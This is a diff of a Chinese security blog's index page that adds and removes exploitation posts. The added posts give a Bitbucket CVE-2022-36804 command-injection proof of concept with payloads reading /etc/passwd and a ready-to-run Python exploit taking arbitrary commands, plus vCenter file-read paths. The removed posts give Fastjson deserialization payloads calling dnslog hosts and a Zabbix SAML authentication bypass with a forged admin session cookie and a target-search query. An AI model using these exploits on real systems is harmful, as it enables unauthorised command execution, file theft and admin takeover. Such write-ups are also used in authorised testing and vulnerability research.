@@ -184,6 +184,181 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pages/WEB%E5%BA%94%E7%94%A8/Atlassian-Bitbucket-Server.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="气温太低">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qwtd-blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pages/WEB%E5%BA%94%E7%94%A8/Atlassian-Bitbucket-Server.html" class="post-title-link" itemprop="url">Atlassian-Bitbucket</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-09-22 15:56:49" itemprop="dateCreated datePublished" datetime="2022-09-22T15:56:49+08:00">2022-09-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-16 10:41:58" itemprop="dateModified" datetime="2023-04-16T10:41:58+08:00">2023-04-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E5%BA%94%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">WEB应用</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Atlassian-Bitbucket-Server">1. Atlassian Bitbucket Server</h1><h2 id="CVE-2022-36804">1.1. CVE-2022-36804</h2><h3 id="漏洞描述">1.1.1. 漏洞描述</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Atlassian 发布安全公告，披露了 Bitbucket Server 和 Data Center 在 7.0.0 版中引入了一个严重安全漏洞。官方漏洞公告中描述 Bitbucket Server 和 Data Center 多个 API 端点存在命令注入漏洞，漏洞触发条件是攻击者具备公开项目的访问权限或者私有项目的可读权限，影响版本从 7.0 到 8.3</span><br></pre></td></tr></table></figure>
+
+<h3 id="影响版本">1.1.2. 影响版本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Atlassian Bitbucket 7.0～8.3</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞复现">1.1.3. 漏洞复现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、需要存在未授权访问,如下图所示</span><br><span class="line">http://xxx/repos?visibility=public</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220921220157561.png" alt="image-20220921220157561"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2、记住下图链接地址</span><br><span class="line">https://xxx/projects/OIT/repos/heroku-buildpack-python/browse</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220921220715799.png" alt="image-20220921220715799"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">3、将下面poc &#123;projects&#125;部分替换成步骤2的 projects/OIT/repos/heroku-buildpack-python</span><br><span class="line"></span><br><span class="line">/rest/api/latest/&#123;projects&#125;/archive?filename=wN3Am&amp;at=wN3Am&amp;path=wN3Am&amp;prefix=ax%00--exec=%60id%60%00--remote=origin</span><br><span class="line"></span><br><span class="line">/archive?filename=kiE0h&amp;at=kiE0h&amp;path=kiE0h&amp;prefix=ax%00--exec=%60cat%20etc%2fpasswd%60%00--remote=origin</span><br><span class="line">/archive?filename=kiE0h&amp;at=kiE0h&amp;path=kiE0h&amp;prefix=ax%00--exec=%60pwd%60%00--remote=origin</span><br><span class="line">/archive?filename=kiE0h&amp;at=kiE0h&amp;path=kiE0h&amp;prefix=ax/%00--help%00--%00--remote=origin</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220921223556248.png" alt="image-20220921223556248"></p>
+<h3 id="EXP">1.1.4. EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">main</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GetArgv</span>(<span class="params">self</span>):</span><br><span class="line">        parse = argparse.ArgumentParser()</span><br><span class="line">        parse.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&quot;Remote Target URL&quot;</span>, dest=<span class="string">&quot;url&quot;</span>)</span><br><span class="line">        parse.add_argument(<span class="string">&quot;-cmd&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&quot;id&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Execute Command&quot;</span>, dest=<span class="string">&quot;cmd&quot;</span>)</span><br><span class="line">        arg = parse.parse_args()  <span class="comment"># 解析参数</span></span><br><span class="line">        <span class="keyword">return</span> arg</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exp</span>(<span class="params">self, url, cmd</span>):</span><br><span class="line">        test_url = <span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>repos?visibility=public&#x27;</span></span><br><span class="line">        resp = requests.get(test_url, headers=headers).text</span><br><span class="line">        title = re.findall(<span class="string">&#x27;&lt;title&gt;(.*?)&lt;/title&gt;&#x27;</span>, resp)</span><br><span class="line">        vul_url = re.findall(<span class="string">&#x27;,&quot;self&quot;:\[\&#123;&quot;href&quot;:&quot;(.*?)/browse&quot;&#125;]&#125;&#125;&#x27;</span>, resp)</span><br><span class="line">        <span class="keyword">if</span> title[<span class="number">0</span>] == <span class="string">&#x27;Public Repositories - Bitbucket&#x27;</span>:</span><br><span class="line">            projects = vul_url[<span class="number">0</span>].split(url,<span class="number">2</span>)[<span class="number">1</span>]</span><br><span class="line">            POC = <span class="string">f&#x27;rest/api/latest/<span class="subst">&#123;projects&#125;</span>/archive?filename=wN3Am&amp;at=wN3Am&amp;path=wN3Am&amp;prefix=ax%00--exec=%60<span class="subst">&#123;cmd&#125;</span>%60%00--remote=origin&#x27;</span></span><br><span class="line">            result = requests.get(url=<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span><span class="subst">&#123;POC&#125;</span>&#x27;</span>,headers=headers)</span><br><span class="line">            final_result = re.findall(<span class="string">&#x27;1: (.*?):&#x27;</span>, result.text)</span><br><span class="line">            <span class="keyword">if</span> result.status_code == <span class="number">500</span>:</span><br><span class="line">                <span class="built_in">print</span>(final_result[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = main().GetArgv()</span><br><span class="line">    exp = main().Exp(url=parser.url,cmd=parser.cmd)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221005201329446.png" alt="image-20221005201329446"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pages/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Vmware-vcenter.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="气温太低">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qwtd-blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pages/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Vmware-vcenter.html" class="post-title-link" itemprop="url">vmware-vcenter</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-09-16 15:56:49" itemprop="dateCreated datePublished" datetime="2022-09-16T15:56:49+08:00">2022-09-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-15 22:59:23" itemprop="dateModified" datetime="2023-04-15T22:59:23+08:00">2023-04-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/" itemprop="url" rel="index"><span itemprop="name">网络设备</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="任意文件读取">0.0.1. 任意文件读取</h3><h4 id="windows">0.0.1.1. windows</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220916174608979.png" alt="image-20220916174608979"></p>
+<h4 id="linux">0.0.1.2. linux</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/eam/vib?id=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220916174733158.png" alt="image-20220916174733158"></p>
+<h3 id="任意文件上传CVE-2021-21972">0.0.2. 任意文件上传CVE-2021-21972</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ui/vropspluginui/rest/services/uploadova存在任意文件上传漏洞</span><br><span class="line">使用railgun工具</span><br></pre></td></tr></table></figure>
+
+<h3 id="远程代码执行CVE-2021-21985">0.0.3. 远程代码执行CVE-2021-21985</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用railgun工具</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220916174450563.png" alt="image-20220916174450563"></p>
+<h3 id="任意文件上传CVE-2021-22005">0.0.4. 任意文件上传CVE-2021-22005</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用railgun工具</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/pages/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Hikvison.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -882,184 +1057,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/pages/WEB%E6%A1%86%E6%9E%B6/Fastjson.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="气温太低">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="qwtd-blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/pages/WEB%E6%A1%86%E6%9E%B6/Fastjson.html" class="post-title-link" itemprop="url">FastJson</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-07-24 15:56:49" itemprop="dateCreated datePublished" datetime="2022-07-24T15:56:49+08:00">2022-07-24</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-04-18 19:18:55" itemprop="dateModified" datetime="2023-04-18T19:18:55+08:00">2023-04-18</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/WEB%E6%A1%86%E6%9E%B6/" itemprop="url" rel="index"><span itemprop="name">WEB框架</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="FastJson反序列化漏洞">1. FastJson反序列化漏洞</h1><h2 id="风险描述：">1.1. 风险描述：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastjson是啊里巴巴的的开源库，用于对JSON格式的数据进行解析和打包，fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞利用：">1.2. 漏洞利用：</h2><p>可以通过burp插件FastJsonScan实现被动扫描检测。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;x&quot;:			&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;com.mysql.jdbc.JDBC4Connection&quot;,&quot;hostToConnectTo&quot;:&quot;wq122qedk25rwzt.fwxxn1.dnslog.cn&quot;,&quot;portToConnectTo&quot;:80,&quot;info&quot;:&#123;&quot;user&quot;:&quot;root&quot;,&quot;password&quot;:&quot;ubuntu&quot;,&quot;useSSL&quot;:&quot;false&quot;,&quot;statementInterceptors&quot;:&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,&quot;autoDeserialize&quot;:&quot;true&quot;&#125;,&quot;databaseToConnectTo&quot;:&quot;mysql&quot;,&quot;url&quot;:&quot;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416091752822.png" alt="image-20230416091752822"></p>
-<h3 id="Fastjson1-2-68">1.2.1. Fastjson1.2.68</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;hade35.dnslog.cn&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞修复：">1.3. 漏洞修复：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1、将fastjson升级至最新版本。</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/pages/WEB%E5%BA%94%E7%94%A8/Zabbix.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="气温太低">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="qwtd-blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/pages/WEB%E5%BA%94%E7%94%A8/Zabbix.html" class="post-title-link" itemprop="url">Zabbix</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-07-24 15:56:49" itemprop="dateCreated datePublished" datetime="2022-07-24T15:56:49+08:00">2022-07-24</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-04-16 10:42:33" itemprop="dateModified" datetime="2023-04-16T10:42:33+08:00">2023-04-16</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/WEB%E5%BA%94%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">WEB应用</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="zabbix认证绕过漏洞（CVE-2022-23131）">1. zabbix认证绕过漏洞（CVE-2022-23131）</h1><h2 id="风险描述">1.1. 风险描述:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Zabbix是拉脱维亚Zabbix SIA公司的一套开源的监控系统。该系统支持网络监控、服务器监控、云监控和应用监控等。Zabbix Frontend 存在安全漏洞，该漏洞源于在启用 SAML SSO 身份验证（非默认）的情况下，恶意行为者可以修改会话数据，因为存储在会话中的用户登录未经过验证。 未经身份验证的恶意攻击者可能会利用此问题来提升权限并获得对 Zabbix 前端的管理员访问权限。</span><br></pre></td></tr></table></figure>
-
-<p><code>fofa:app=&quot;ZABBIX-监控系统&quot; &amp;&amp; body=&quot;saml&quot;</code></p>
-<p><img src="https://s2.loli.net/2022/07/25/RyFqEgfjbirVC4I.png" alt="image-20220725005801979"></p>
-<h2 id="影响版本">1.2. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">4.0.36</span><br><span class="line"></span><br><span class="line">5.4.0</span><br><span class="line"></span><br><span class="line">5.4.8</span><br><span class="line"></span><br><span class="line">6.0.0alpha1</span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞复现：">1.3. 漏洞复现：</h2><p><img src="https://s2.loli.net/2022/07/25/ad2ioMbjwvIV7Y8.png" alt="image-20220725005445702"></p>
-<p>通过请求原始页面，获取zbx_session字段的值为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJzZXNzaW9uaWQiOiJlM2NlNDY4ZjE3NjMyZjBkNTgxZjdjZDEyNmJlNGM1YSIsInNpZ24iOiI4M2FkMTc1YjE1ZGNkNTJkMDI1NDljYjRiYzRkN2FmMGFjYTY5ZTIzNWYyODg3NjY5ZjdiMjA4OTRiN2RiNGFjIn0%3D</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2022/07/25/bDujAFrL7sd5lgE.png" alt="image-20220725020207605"></p>
-<p>先进行URL解码（%3D为&#x3D;）再将值进行base64解码</p>
-<p><img src="https://s2.loli.net/2022/07/25/MlZWt9Cjeun17Vs.png" alt="image-20220725011909395"></p>
-<p>解码成功后构造payload，将解码后的参数值替换下方参数值</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;saml_data&quot;:&#123;&quot;username_attribute&quot;:&quot;Admin&quot;&#125;,&quot;sessionid&quot;:&quot;4e468962568f645232585a9d73532bf1&quot;,&quot;sign&quot;:&quot;e5a421ca587c0539c9f83560ab9975496109ca2ac71f781eff47c656b165e2c8&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>再将上方值进行base64编码</p>
-<p><img src="https://s2.loli.net/2022/07/25/vdrF6nDXYA39wCI.png" alt="image-20220725013812468"></p>
-<p>构造payload，将Cookie字段替换成下列payload再发送数据包，即可登录成功（本文测试站点不存在该漏洞）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiNGU0Njg5NjI1NjhmNjQ1MjMyNTg1YTlkNzM1MzJiZjEiLCJzaWduIjoiZTVhNDIxY2E1ODdjMDUzOWM5ZjgzNTYwYWI5OTc1NDk2MTA5Y2EyYWM3MWY3ODFlZmY0N2M2NTZiMTY1ZTJjOCJ9</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2022/07/25/2thvQGZbRenSiCm.png" alt="image-20220725020834242"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1131,14 +1128,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">51</span>
+          <span class="site-state-item-count">53</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-count">20</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
   </nav>
